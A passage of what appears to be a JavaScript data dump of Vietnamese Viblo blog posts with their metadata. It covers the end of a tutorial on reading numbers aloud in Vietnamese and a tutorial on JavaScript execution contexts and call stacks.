h\u1ee3p.\n\n## 2. Gh\u00e9p th\u00e0nh code ho\u00e0n ch\u1ec9nh\n\nCho xem th\u00e0nh qu\u1ea3 tr\u01b0\u1edbc nh\u00e9, hihi :100:\n\n\n\n### 2.1. Khi switch s\u1eed d\u1ee5ng strict comparison\n\nNh\u1edb l\u1ea1i function `readTwo()` c\u00f3 s\u1eed d\u1ee5ng c\u00e2u l\u1ec7nh switch. M\u00ecnh kh\u00e1 ch\u1eafc l\u00e0 v\u1eabn c\u00f2n nhi\u1ec1u b\u1ea1n ch\u01b0a bi\u1ebft \u0111i\u1ec1u n\u00e0y.\n\n> Trong JavaScript th\u00ec switch s\u1eed d\u1ee5ng strict comparison\n> \n> Ngh\u0129a l\u00e0 khi so s\u00e1nh c\u00e1c case, d\u1ea5u === s\u1ebd \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng thay v\u00ec ==.\n\nDo code ch\u00fang ta ch\u1ec9 c\u1eaft chu\u1ed7i v\u00e0o bi\u1ebfn `a`, `b`, `c` n\u00ean so s\u00e1nh trong switch s\u1ebd lu\u00f4n b\u1ecb false. Do \u0111\u00f3, ch\u00fang ta c\u1ea7n d\u00f9ng `parseInt()` \u0111\u1ec3 chuy\u1ec3n th\u00e0nh s\u1ed1.\n\n```js\n// \u0110\u1ecdc t\u1eebng ph\u1ea7n\nconst output = [];\nfor (let i = 0; i < num.length / 3; i++) {\n    let [a, b, c] = num.substr(i * 3, 3);\n    a = parseInt(a);\n    b = parseInt(b);\n    c = parseInt(c);\n    \n    // \u1ede \u0111\u00e2y m\u00ecnh set c\u1ee9ng readZeroHundred lu\u00f4n l\u00e0 true\n    output.push(...readThree(a, b, c, true));  // D\u00f9ng spread operator\n    \n    // \u0110\u1ecdc ph\u1ea7n \u0111\u01a1n v\u1ecb c\u1ee7a nh\u00f3m\n    output.push(UNITS[num.length / 3 - 1 - i]);\n}\n\n// Sau khi ho\u00e0n t\u1ea5t th\u00ec ch\u1ec9 c\u1ea7n join l\u1ea1i l\u00e0 \u0111\u01b0\u1ee3c\nconsole.log(output.join(\' \'));\n```\n\nB\u00ean tr\u00ean l\u00e0 code \u0111\u00e3 kh\u00e1 ho\u00e0n ch\u1ec9nh r\u1ed3i.\n\n### 2.2. X\u00e1c \u0111\u1ecbnh nh\u00f3m \u0111\u1ea7u ti\u00ean\n\nNh\u01b0 \u0111\u00e3 n\u00f3i \u1edf tr\u00ean, khi g\u1ecdi `readThree()` tr\u00ean t\u1eebng nh\u00f3m, th\u00ec tham s\u1ed1 `readZeroHundred` nh\u00f3m \u0111\u1ea7u ti\u00ean l\u00e0 false, c\u00e1c nh\u00f3m c\u00f2n l\u1ea1i l\u00e0 true h\u1ebft. V\u1ea5n \u0111\u1ec1 \u0111\u1eb7t ra l\u00e0 l\u00e0m sao bi\u1ebft \u0111\u00e2u l\u00e0 nh\u00f3m \u0111\u1ea7u ti\u00ean?\n\n\u0110\u01a1n gi\u1ea3n, nh\u00f3m \u0111\u1ea7u ti\u00ean c\u00f3 ch\u1ec9 s\u1ed1 `i = 0`. M\u00ecnh \u0111\u1eb7t th\u00eam bi\u1ebfn `isFirstGroup` \u0111\u1ec3 code d\u1ec5 \u0111\u1ecdc h\u01a1n.\n\n```js\n// \u0110\u1ecdc t\u1eebng ph\u1ea7n\nconst output = [];\nfor (let i = 0; i < num.length / 3; i++) {\n    let [a, b, c] = num.substr(i * 3, 3);\n    a = parseInt(a);\n    b = parseInt(b);\n    c = parseInt(c);\n    \n    // S\u1eeda l\u1ea1i \u1edf \u0111\u00e2y\n    const isFirstGroup = i == 0;\n    output.push(...readThree(a, b, c, !isFirstGroup));  // D\u00f9ng spread operator\n    \n    // \u0110\u1ecdc ph\u1ea7n \u0111\u01a1n v\u1ecb c\u1ee7a nh\u00f3m\n    output.push(UNITS[num.length / 3 - 1 - i]);\n}\n\n// Sau khi ho\u00e0n t\u1ea5t th\u00ec ch\u1ec9 c\u1ea7n join l\u1ea1i l\u00e0 \u0111\u01b0\u1ee3c\nconsole.log(output.join(\' \'));\n```\n\nL\u00fac n\u00e0y `readZeroHundred` s\u1ebd l\u00e0 ph\u1ee7 \u0111\u1ecbnh c\u1ee7a `isFirstGroup`, ngh\u0129a l\u00e0 n\u1ebfu l\u00e0 nh\u00f3m \u0111\u1ea7u ti\u00ean th\u00ec `readZeroHundred` l\u00e0 false, ng\u01b0\u1ee3c l\u1ea1i l\u00e0 true.\n\nV\u00e0 \u0111\u00e2y l\u00e0 k\u1ebft qu\u1ea3, t\u00e8n ten :100: D\u00f2ng \u0111\u1ea7u ti\u00ean l\u00e0 set c\u1ee9ng `readZeroHundred` l\u00e0 true, c\u00f2n d\u00f2ng sau l\u00e0 code m\u1edbi s\u1eeda l\u1ea1i.\n\n![](https://images.viblo.asia/8d69a25e-9786-4a8b-8e2e-e7b57544f78b.png)\n\nTo\u00e0n b\u1ed9 code ho\u00e0n ch\u1ec9nh m\u00ecnh \u0111\u1ec3 ngay \u0111\u00e2y https://gist.github.com/tonghoangvu/e3f27e8b6815b5fd83b39fd5502c6d43. Cho m\u00ecnh m\u1ed9t star n\u1ebfu b\u1ea1n th\u00edch nh\u00e9.\n\n---\n\nB\u00e0i vi\u1ebft t\u1edbi \u0111\u00e2y l\u00e0 h\u1ebft r\u1ed3i. V\u00e0 ngay sau \u0111\u00e2y l\u00e0 th\u1eed th\u00e1ch d\u00e0nh cho c\u00e1c b\u1ea1n. H\u00e3y th\u1eed m\u1edf r\u1ed9ng ph\u1ea1m vi \u0111\u1ec1 ra nh\u01b0 sau:\n\n* Cho ph\u00e9p \u0111\u1ecdc c\u1ea3 s\u1ed1 \u00e2m. V\u00ed d\u1ee5 `10` \u0111\u1ecdc l\u00e0 `m\u01b0\u1eddi`, c\u00f2n `-10` \u0111\u1ecdc l\u00e0 `\u00e2m m\u01b0\u1eddi`.\n* \u0110\u1ecdc c\u00e1c ch\u1eef s\u1ed1 sau ph\u1ea7n th\u1eadp ph\u00e2n. V\u00ed d\u1ee5 `3.14` \u0111\u1ecdc l\u00e0 `ba ch\u1ea5m m\u01b0\u1eddi b\u1ed1n`.\n* Chu\u1ea9n h\u00f3a input tr\u01b0\u1edbc khi \u0111\u1ecdc (v\u00ed d\u1ee5 lo\u1ea1i b\u1ecf c\u00e1c s\u1ed1 0 \u0111\u1ea7u b\u1ecb th\u1eeba, hay c\u00e1c s\u1ed1 0 sau c\u00f9ng ph\u1ea7n th\u1eadp ph\u00e2n)\n* Th\u00eam c\u00e1c t\u00ednh n\u0103ng kh\u00e1c nh\u01b0 \u0111\u1ecdc ph\u1ea7n \u0111\u01a1n v\u1ecb (v\u00ed d\u1ee5 `\u0111\u1ed3ng`, `\u0111\u01a1n v\u1ecb`,...) m\u00e0 b\u1ea1n c\u00f3 th\u1ec3 ngh\u0129 ra.\n* Lo\u1ea1i b\u1ecf c\u00e1c v\u1ecb tr\u00ed set c\u1ee9ng t\u1eeb v\u00ed d\u1ee5 "m\u1ed1t", "t\u01b0",... v\u00e0 thay b\u1eb1ng c\u00e1c bi\u1ebfn config\n\nN\u1ebfu c\u1ea3m th\u1ea5y b\u00e0i vi\u1ebft h\u1eefu \u00edch, \u0111\u1eebng ng\u1ea1i clip v\u00e0 upvote cho t\u1edb nh\u00e9 :heart_eyes: M\u00e3i th\u00e2n.',
      published_at: "2021-02-22 17:48:27",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 00:00:27",
      translation_source: null,
      trend_at: "2021-03-10 07:44:15",
      promoted_at: null,
      reading_time: 7,
      points: 6,
      views_count: 1162,
      clips_count: 2,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: true,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/949625ed-df7a-4022-85e0-082fbbc335c8.jpg",
      user: {
        data: {
          id: 44447,
          url: "https://viblo.asia/u/tonghoangvu",
          avatar: "b0103728-95ff-4934-a588-f007f0d3b93a.png",
          name: "T\u1ed1ng Ho\u00e0ng V\u0169",
          username: "tonghoangvu",
          followers_count: 48,
          reputation: 1284,
          posts_count: 29,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 44447,
            url: "https://viblo.asia/u/tonghoangvu",
            avatar: "b0103728-95ff-4934-a588-f007f0d3b93a.png",
            name: "T\u1ed1ng Ho\u00e0ng V\u0169",
            username: "tonghoangvu",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50987,
      title: "JavaScript Execution Contexts and Call Stacks",
      slug: "ByEZkaN45Q0",
      url:
        "https://viblo.asia/p/javascript-execution-contexts-and-call-stacks-ByEZkaN45Q0",
      user_id: 149,
      moderation: null,
      transliterated: "javascript-execution-contexts-and-call-stacks",
      contents_short:
        "JavaScript \u0111\u00e3 tr\u1edf th\u00e0nh m\u1ed9t trong nh\u1eefng ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh ph\u1ed5 bi\u1ebfn nh\u1ea5t hi\u1ec7n nay. N\u00f3 c\u0169ng d\u1eabn \u0111\u1ea7u v\u1ec1 s\u1ed1 l\u01b0\u1ee3ng repository GitHub v\u00e0 l\u00e0 ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh \u0111\u01b0\u1ee3c th\u1ea3o lu\u1eadn nhi\u1ec1u nh\u1ea5t tr\u00ean StackOverflo...",
      contents:
        "`JavaScript` \u0111\u00e3 tr\u1edf th\u00e0nh m\u1ed9t trong nh\u1eefng ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh ph\u1ed5 bi\u1ebfn nh\u1ea5t hi\u1ec7n nay. N\u00f3 c\u0169ng d\u1eabn \u0111\u1ea7u v\u1ec1 s\u1ed1 l\u01b0\u1ee3ng repository GitHub v\u00e0 l\u00e0 ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh \u0111\u01b0\u1ee3c th\u1ea3o lu\u1eadn nhi\u1ec1u nh\u1ea5t tr\u00ean `StackOverflow`.\n\nDo \u0111\u00f3, \u0111i\u1ec1u r\u1ea5t quan tr\u1ecdng l\u00e0 b\u1ea1n ph\u1ea3i hi\u1ec3u r\u00f5 nh\u1eefng \u0111i\u1ec1u c\u01a1 b\u1ea3n v\u00e0 bi\u1ebft \u0111i\u1ec1u g\u00ec x\u1ea3y ra \u0111\u1eb1ng sau b\u1ea5t k\u1ef3 ch\u01b0\u01a1ng tr\u00ecnh JS n\u00e0o v\u00e0 n\u00f3 \u0111\u01b0\u1ee3c th\u1ef1c thi nh\u01b0 th\u1ebf n\u00e0o, n\u1ebfu b\u1ea1n mu\u1ed1n \u0111i s\u00e2u v\u00e0o JS.\n\n## Execution Context (EC)\n\nM\u1ecdi th\u1ee9 trong JS \u0111\u1ec1u x\u1ea3y ra b\u00ean trong `Execution Context`. N\u00f3 l\u00e0 m\u00f4i tr\u01b0\u1eddng m\u00e0 m\u00e3 JS \u0111\u01b0\u1ee3c th\u1ef1c thi. N\u00f3 bao g\u1ed3m gi\u00e1 tr\u1ecb c\u1ee7a \u2018this\u2019, c\u00e1c bi\u1ebfn, \u0111\u1ed1i t\u01b0\u1ee3ng v\u00e0 funtions m\u00e0 m\u00e3 JS c\u00f3 quy\u1ec1n truy c\u1eadp v\u00e0o b\u1ea5t k\u1ef3 th\u1eddi \u0111i\u1ec3m c\u1ee5 th\u1ec3 n\u00e0o d\u01b0\u1edbi d\u1ea1ng c\u00e1c c\u1eb7p `key-value`. M\u1ed7i `code block` s\u1ebd c\u00f3 `EC` ri\u00eang m\u00e0 n\u00f3 \u0111ang th\u1ef1c thi.\n\n![](https://images.viblo.asia/2c66423f-b9af-4eb0-a7b0-7e348a10e267.png)\n\nH\u00e3y nh\u00ecn v\u00e0o h\u00ecnh ph\u00eda tr\u00ean, n\u00f3 bao g\u1ed3m hai ph\u1ea7n \n- B\u1ed9 nh\u1edb (memory): T\u1ea5t c\u1ea3 c\u00e1c bi\u1ebfn c\u00f3 trong code c\u1ee7a b\u1ea1n \u0111\u01b0\u1ee3c l\u01b0u tr\u1eef \u1edf \u0111\u00e2y d\u01b0\u1edbi d\u1ea1ng c\u00e1c c\u1eb7p `key-value`\n- Code: \u0110\u00e2y l\u00e0 m\u1ed9t thread n\u01a1i code \u0111\u01b0\u1ee3c th\u1ef1c thi, m\u1ed9t d\u00f2ng t\u1ea1i m\u1ed9t th\u1eddi \u0111i\u1ec3m\n\n### Types of Execution Contexts\n\n- **Global Execution Context (GEC)** : N\u00f3 \u0111\u01b0\u1ee3c t\u1ea1o m\u1ed9t l\u1ea7n cho m\u1ecdi ch\u01b0\u01a1ng tr\u00ecnh theo m\u1eb7c \u0111\u1ecbnh. N\u00f3 bao g\u1ed3m code kh\u00f4ng c\u00f3 b\u00ean trong b\u1ea5t k\u1ef3 ch\u1ee9c n\u0103ng (function) n\u00e0o. GEC ch\u1ecbu tr\u00e1ch nhi\u1ec7m ch\u00ednh v\u1ec1 hai vi\u1ec7c: \n    - n\u00f3 t\u1ea1o ra m\u1ed9t \u0111\u1ed1i t\u01b0\u1ee3ng to\u00e0n c\u1ee5c (global object) l\u00e0 window object (d\u00e0nh cho c\u00e1c tr\u00ecnh duy\u1ec7t)\n    - n\u00f3 \u0111\u1eb7t gi\u00e1 tr\u1ecb c\u1ee7a `this` b\u1eb1ng `global object`. \n    \n    GEC b\u1ecb clear sau khi qu\u00e1 tr\u00ecnh th\u1ef1c thi to\u00e0n b\u1ed9 ch\u01b0\u01a1ng tr\u00ecnh k\u1ebft th\u00fac.\n\n- **Function Execution Context (FEC)** : M\u1ed7i khi m\u1ed9t h\u00e0m \u0111\u01b0\u1ee3c g\u1ecdi, m\u1ed9t execution context s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o cho h\u00e0m \u0111\u00f3. N\u00f3 s\u1ebd \u0111\u01b0\u1ee3c clear khi h\u00e0m tr\u1ea3 v\u1ec1 th\u1ee9 g\u00ec \u0111\u00f3 ho\u1eb7c qu\u00e1 tr\u00ecnh th\u1ef1c thi c\u1ee7a n\u00f3 k\u1ebft th\u00fac.\n\n### How is an Execution Context created\n\n![](https://images.viblo.asia/25cef4bc-06c3-449a-a1ad-431a7c5ade58.png)\n\nJavaScript Engine t\u1ea1o `Execution Context` trong 2 giai \u0111o\u1ea1n:\n- **Creation Phase**: ITrong giai \u0111o\u1ea1n n\u00e0y, `JS engine` ch\u1ec9 qu\u00e9t to\u00e0n b\u1ed9 code nh\u01b0ng kh\u00f4ng th\u1ef1c thi n\u00f3. N\u00f3 t\u1ea1o `scope chain` r\u1ed3i c\u1ea5p ph\u00e1t b\u1ed9 nh\u1edb cho m\u1ecdi bi\u1ebfn (v\u1edbi gi\u00e1 tr\u1ecb c\u1ee7a n\u00f3 l\u00e0 `undefined`) v\u00e0 c\u00e1c `function` trong ph\u1ea1m vi c\u1ee7a n\u00f3. Sau \u0111\u00f3, n\u00f3 c\u0169ng kh\u1edfi t\u1ea1o gi\u00e1 tr\u1ecb c\u1ee7a `this`.\n\n- **Execution Phase**: Trong giai \u0111o\u1ea1n n\u00e0y, JS engine th\u1ef1c hi\u1ec7n qu\u00e9t l\u1ea1i code \u0111\u1ec3 c\u1eadp nh\u1eadt c\u00e1c bi\u1ebfn v\u00e0 ho\u00e0n t\u1ea5t qu\u00e1 tr\u00ecnh th\u1ef1c thi.\n\nB\u1ea5t c\u1ee9 khi n\u00e0o b\u1ea1n ch\u1ea1y code JS c\u1ee7a m\u00ecnh, trong `Creation Phase`, m\u1ed9t `Global Execution Context` \u0111\u01b0\u1ee3c t\u1ea1o \u0111\u1ec3 l\u01b0u tr\u1eef t\u1ea5t c\u1ea3 c\u00e1c bi\u1ebfn to\u00e0n c\u1ee5c c\u00f3 gi\u00e1 tr\u1ecb l\u00e0 `undefined` v\u00e0 c\u00e1c function v\u1edbi ph\u1ea7n th\u00e2n c\u1ee7a n\u00f3 l\u00e0 gi\u00e1 tr\u1ecb. Sau \u0111\u00f3, m\u1ed9t unique EC \u0111\u01b0\u1ee3c t\u1ea1o cho c\u00e1c function kh\u00e1c ho\u1ea1t \u0111\u1ed9ng theo c\u00f9ng m\u1ed9t c\u00e1ch :\n- tr\u01b0\u1edbc ti\u00ean n\u00f3 l\u01b0u tr\u1eef v\u00e0 c\u1ea5p ph\u00e1t b\u1ed9 nh\u1edb cho t\u1ea5t c\u1ea3 c\u00e1c bi\u1ebfn c\u1ee5c b\u1ed9 c\u1ee7a h\u00e0m \u0111\u00f3\n- th\u1ef1c thi block code v\u00e0 t\u1ef1 h\u1ee7y sau khi `Execution Phase` c\u1ee7a n\u00f3 k\u1ebft th\u00fac.\n\nV\u00ed d\u1ee5:\n\n```js\nvar a = 10;\n\nfunction doubleTheNumber(number) {\n    var doubleNumber = 2 * number;\n    return doubleNumber;\n}\n\nvar result = doubleTheNumber(a);\nconsole.log(result);\n```\n\nV\u1edbi \u0111o\u1ea1n code tr\u00ean, khi th\u1ef1c thi n\u00f3 s\u1ebd ch\u1ea1y nh\u01b0 sau:\n1. Khi \u0111o\u1ea1n code tr\u00ean \u0111\u01b0\u1ee3c ch\u1ea1y, \u0111\u1ea7u ti\u00ean n\u00f3 s\u1ebd v\u00e0o `Creation Phase`. To\u00e0n b\u1ed9 code \u0111\u01b0\u1ee3c `JS engine` scan v\u00e0 `Global Execution Context` \u0111\u01b0\u1ee3c t\u1ea1o.\n\n![](https://images.viblo.asia/cdd44282-2ff1-49ca-b663-35761a972f55.png)\n\n2. Trong l\u1ea7n scan th\u1ee9 2, khi n\u00f3 \u0111ang trong `Execution Phase`, m\u1ed7i d\u00f2ng code s\u1ebd \u0111\u01b0\u1ee3c scan t\u1eeb tr\u00ean xu\u1ed1ng d\u01b0\u1edbi v\u00e0 gi\u00e1 tr\u1ecb c\u1ee7a `a` \u0111\u01b0\u1ee3c c\u1eadp nh\u1eadt th\u00e0nh `10` - b\u1edfi v\u00ec JavaScript l\u00e0 ng\u00f4n ng\u1eef \u0111\u1ed3ng b\u1ed9, \u0111\u01a1n lu\u1ed3ng n\u00ean n\u00f3 l\u1ea1i ph\u1ea3i scan l\u1ea1i t\u1eebng d\u00f2ng t\u1eeb tr\u00ean xu\u1ed1ng.\n3. Khi n\u00f3 scan t\u1edbi d\u00f2ng `var result = doubleTheNumber(a)`. N\u00f3 s\u1ebd v\u00e0o `function` n\u00e0y \u0111\u1ec3 qu\u00e9t.\n\n![](https://images.viblo.asia/99c05d5e-cf89-41f2-b1eb-aa9f0be0fb65.png)\n\n4. B\u00e2y gi\u1edd, \u0111\u1ec3 th\u1ef1c thi function n\u00e0y, c\u00e1c b\u01b0\u1edbc th\u1ef1c thi s\u1ebd t\u01b0\u01a1ng t\u1ef1 c\u00e1c b\u01b0\u1edbc tr\u00ean. M\u1ed9t `EC` s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o cho n\u00f3. Trong `creation phase`, b\u1ed9 nh\u1edb s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o cho `DoubleNumber`.\n\n![](https://images.viblo.asia/829e6fbb-a033-4c9f-9b65-78defb3cb6e6.png)\n\n5. Trong giai \u0111o\u1ea1n th\u1ef1c thi c\u1ee7a h\u00e0m n\u00e0y, v\u00ec gi\u00e1 tr\u1ecb c\u1ee7a `number` l\u00e0 10 n\u00ean `doubledNumber` s\u1ebd l\u00e0 2 * 10, t\u1ee9c l\u00e0 20. Sau \u0111\u00f3 n\u00f3 s\u1ebd tr\u1ea3 v\u1ec1 `20`\n\n![](https://images.viblo.asia/1e820bff-bf60-44b3-9c8c-1086a95cb4b0.png)\n\n6. Sau c\u00e2u l\u1ec7nh `return`, `execution context` cho h\u00e0m `doubleTheNumber` s\u1ebd \u0111\u01b0\u1ee3c h\u1ee7y/clear v\u00e0 JS Engine quay tr\u1edf l\u1ea1i d\u00f2ng `var result = doubleTheNumber(a)`, n\u01a1i gi\u00e1 tr\u1ecb c\u1ee7a `result` s\u1ebd \u0111\u01b0\u1ee3c c\u1eadp nh\u1eadt th\u00e0nh 20. \n7. D\u00f2ng cu\u1ed1i c\u00f9ng c\u1ee7a code \u0111\u01b0\u1ee3c th\u1ef1c thi - `console.log(result);` - sau \u0111\u00f3 `Global Execution Context` c\u1ee7a ch\u01b0\u01a1ng tr\u00ecnh n\u00e0y s\u1ebd \u0111\u01b0\u1ee3c h\u1ee7y/clear.\n\n\u1ede v\u00ed d\u1ee5 tr\u00ean, c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 hi\u1ec3u \u0111\u01b0\u1ee3c l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 m\u1ed9t `JS Program` \u0111\u01b0\u1ee3c th\u1ef1c thi. Tuy nhi\u00ean, trong th\u1ef1c t\u1ebf, qu\u00e1 tr\u00ecnh th\u1ef1c thi c\u1ee7a n\u00f3 s\u1ebd kh\u00f4ng th\u1eb3ng tu\u1ed9t nh\u01b0 c\u00e1c b\u01b0\u1edbc t\u1eeb 1-7 nh\u01b0 \u1edf tr\u00ean. JS Engine s\u1eed d\u1ee5ng `CALL STACK` \u0111\u1ec3 qu\u1ea3n l\u00fd v\u00e0 th\u1ef1c thi c\u00e1c b\u01b0\u1edbc n\u00e0y.\n\n## CALL STACK\n\nCall Stack duy tr\u00ec th\u1ee9 t\u1ef1 th\u1ef1c hi\u1ec7n c\u00e1c `Execution Contexts`. N\u00f3 c\u00f2n \u0111\u01b0\u1ee3c g\u1ecdi b\u1eb1ng nh\u1eefng c\u00e1i t\u00ean nh\u01b0 `Program Stack`, `Control Stack`, `Runtime Stack`, v.v.\n\n![](https://images.viblo.asia/ecf5ca20-afc5-4bd4-961a-bcb710f76fe7.png)\n\nN\u00f3 l\u00e0 m\u1ed9t ng\u0103n x\u1ebfp/stack bao g\u1ed3m t\u1ea5t c\u1ea3 c\u00e1c EC. GEC lu\u00f4n l\u00e0 EC \u0111\u1ea7u ti\u00ean \u0111\u01b0\u1ee3c push v\u00e0o ng\u0103n x\u1ebfp n\u00e0y v\u00e0 c\u0169ng l\u00e0 EC cu\u1ed1i c\u00f9ng \u0111\u01b0\u1ee3c pop ra. B\u1ea5t c\u1ee9 khi n\u00e0o EC m\u1edbi \u0111\u01b0\u1ee3c t\u1ea1o, n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c push v\u00e0o stack. Khi qu\u00e1 tr\u00ecnh th\u1ef1c thi c\u1ee7a n\u00f3 k\u1ebft th\u00fac ho\u1eb7c n\u00f3 tr\u1ea3 v\u1ec1 m\u1ed9t gi\u00e1 tr\u1ecb n\u00e0o \u0111\u00f3, n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c pop ra ngo\u00e0i v\u00e0 JS engine chuy\u1ec3n \u0111\u1ebfn b\u01b0\u1edbc ti\u1ebfp theo trong Call Stack.\n\nV\u00ed d\u1ee5:\n\n```js\nvar a = 10;\n\nfunction doubleTheNumber(number) {\n    var doubleNumber = 2 * number;\n    return doubleNumber;\n}\n\nvar result = doubleTheNumber(10);\nconsole.log(result);\n```\n\nGi\u1ea3i th\u00edch ho\u1ea1t \u0111\u1ed9ng c\u1ee7a call stack:\n\n![](https://images.viblo.asia/b4e56a9e-c67d-4e4c-abd1-710d3db1dad6.png)\n\n- Khi ch\u1ea1y \u0111o\u1ea1n code tr\u00ean, GEC s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o tr\u01b0\u1edbc ti\u00ean v\u00e0 \u0111\u01b0\u1ee3c \u0111\u1ea9y v\u00e0o ng\u0103n x\u1ebfp. Trong qu\u00e1 tr\u00ecnh th\u1ef1c thi, khi JS Engine th\u1ef1c thi function `doubleTheNumber`, m\u1ed9t EC m\u1edbi s\u1ebd \u0111\u01b0\u1ee3c t\u1ea1o ri\u00eang cho h\u00e0m n\u00e0y v\u00e0 \u0111\u01b0\u1ee3c \u0111\u1ea9y v\u00e0o ng\u0103n x\u1ebfp. Khi qu\u00e1 tr\u00ecnh th\u1ef1c thi k\u1ebft th\u00fac, EC n\u00e0y s\u1ebd \u0111\u01b0\u1ee3c l\u1ea5y ra v\u00e0 JS Engite tr\u1edf l\u1ea1i GEC. Sau khi th\u1ef1c thi ho\u00e0n to\u00e0n \u0111o\u1ea1n code n\u00e0y, GEC n\u00e0y c\u0169ng s\u1ebd \u0111\u01b0\u1ee3c l\u1ea5y ra!\n\nT\u01b0\u01a1ng t\u1ef1, b\u1ea1n c\u0169ng c\u00f3 th\u1ec3 ki\u1ec3m tra th\u1ef1c t\u1ebf c\u00e1ch ho\u1ea1t \u0111\u1ed9ng c\u1ee7a `Call Stack` cho b\u1ea5t k\u1ef3 m\u00e3 JS nh\u1ea5t \u0111\u1ecbnh n\u00e0o.\nCh\u1ea1y code JS c\u1ee7a b\u1ea1n trong tr\u00ecnh duy\u1ec7t -> Open console -> Sources. B\u1ea1n s\u1ebd `Call Stack` nh\u01b0 trong h\u00ecnh d\u01b0\u1edbi \u0111\u00e2y:\n\n![](https://images.viblo.asia/7424cf1b-af68-4c93-b8a6-e6888059c393.png)\n\nT\u1ea1i th\u1eddi \u0111i\u1ec3m n\u00e0y, `Call Stack` s\u1ebd tr\u1ed1ng v\u00ec code \u0111\u00e3 ho\u00e0n th\u00e0nh vi\u1ec7c th\u1ef1c thi. \u0110\u1ec3 xem vi\u1ec7c t\u1ea1o v\u00e0 x\u00f3a c\u00e1c EC, h\u00e3y th\u00eam c\u00e1c breakpoints v\u00e0o code c\u1ee7a b\u1ea1n v\u00e0 ch\u1ea1y th\u00f4i.\n\n\n### Conclusion\n\nPh\u00eda tr\u00ean, ch\u00fang ta \u0111\u00e3 c\u00f9ng \u0111i qua xem c\u00e1ch m\u00e0 m\u1ed9t \u0111o\u1ea1n code \u0111\u01b0\u1ee3c th\u1ef1c thi trong JS nh\u01b0 th\u1ebf n\u00e0o, c\u00e1ch m\u00e0 JS qu\u1ea3n l\u00fd c\u00e1c b\u01b0\u1edbc th\u1ef1c hi\u1ec7n ra sao. Mong r\u1eb1ng n\u00f3 c\u00f3 th\u1ec3 gi\u00fap c\u00e1c b\u1ea1n hi\u1ec3u th\u00eam v\u1ec1 JS v\u00e0 n\u1eafm n\u00f3 r\u00f5 h\u01a1n :smiley: \n\n#### Reference\n- [How does JavaScript work \u2014 Execution Contexts and Call Stacks](https://rupaljain-1699.medium.com/how-does-javascript-work-execution-contexts-and-call-stacks-63121e769a2)",
      published_at: "2021-02-22 11:31:39",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 8,
      points: 5,
      views_count: 136,
      clips_count: 4,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/2c66423f-b9af-4eb0-a7b0-7e348a10e267.png",
      user: {
        data: {
          id: 149,
          url: "https://viblo.asia/u/DoanhPV",
          avatar: "f063f7d3-8913-4706-9df1-cf5feb73eb2f.jpg",
          name: "Ph\u1ea1m V\u0103n Doanh",
          username: "DoanhPV",
          followers_count: 79,
          reputation: 1895,
          posts_count: 28,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "call-stacks",
            name: "Call Stacks",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Call+Stacks&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "execution-contexts",
            name: "Execution Contexts",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Execution+Contexts&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50974,
      title: "Lazy loading and code splitting in Vue.js",
      slug: "4P856A3LlY3",
      url:
        "https://viblo.asia/p/lazy-loading-and-code-splitting-in-vuejs-4P856A3LlY3",
      user_id: 28887,
      moderation: null,
      transliterated: "lazy-loading-and-code-splitting-in-vuejs",
      contents_short:
        "Vi\u1ec7c gi\u1eef cho \u1ee9ng d\u1ee5ng c\u1ee7a b\u1ea1n t\u1ea3i nhanh ng\u00e0y c\u00e0ng kh\u00f3 h\u01a1n. Trong lo\u1ea1t b\u00e0i n\u00e0y, t\u00f4i s\u1ebd \u0111i s\u00e2u v\u00e0o c\u00e1c k\u1ef9 thu\u1eadt t\u1ed1i \u01b0u hi\u1ec7u su\u1ea5t Vue v\u00e0 b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng trong c\u00e1c \u1ee9ng d\u1ee5ng Vue.js c\u1ee7a m\u00ecnh \u0111\u1ec3 l\u00e0m ch...",
      contents:
